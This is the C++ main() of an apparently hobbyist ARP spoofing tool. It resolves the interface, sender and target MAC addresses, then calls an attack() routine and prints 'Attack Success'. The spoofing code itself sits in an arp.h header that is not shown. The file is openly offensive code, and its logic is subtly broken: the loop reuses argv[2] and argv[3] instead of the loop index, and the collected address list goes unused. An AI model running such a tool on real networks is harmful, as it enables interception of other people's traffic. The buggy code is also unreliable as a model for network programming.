#include "arp.h"
#include <list>
using namespace std;

int main(int argc, char *argv[])
{
    if(argc < 4 || argc % 2)
    {
        usage();
        return 0;
    }

    list<Address_info> addressInfoList;
    Address_info tmp;
    tmp.interface = argv[1];

    // 1. Get Sender's MAC Address
    if (!GetSvrMacAddress(&tmp))
    {
        printf("[-]Failed to get %s's MAC address..\n", argv[1]);
        return 0;
    }
    print_mac(argv[1], tmp.hostMac);

    for (int i = 2; i < argc; i+=2)
    {
        uint32_t senderIP = inet_addr(argv[2]);
        uint32_t targetIP = inet_addr(argv[3]);
        memcpy(tmp.senderIp, &senderIP ,IP_ADDR_LEN);
        memcpy(tmp.targetIp, &targetIP ,IP_ADDR_LEN);

        // 2. Get Target & Sender's MAC Address
        if (!GetTargetMacAddress(&tmp))
        {
            printf("[-]Failed to get Target & Sender's MAC address..\n");
            return 0;
        }
        print_mac(argv[2], tmp.senderMac);
        print_mac(argv[3], tmp.targetMac);
        addressInfoList.push_back(tmp);
    }

    // 3. Shoot!
    attack(&tmp);
    printf("[+]Attack Success!!\n");


}
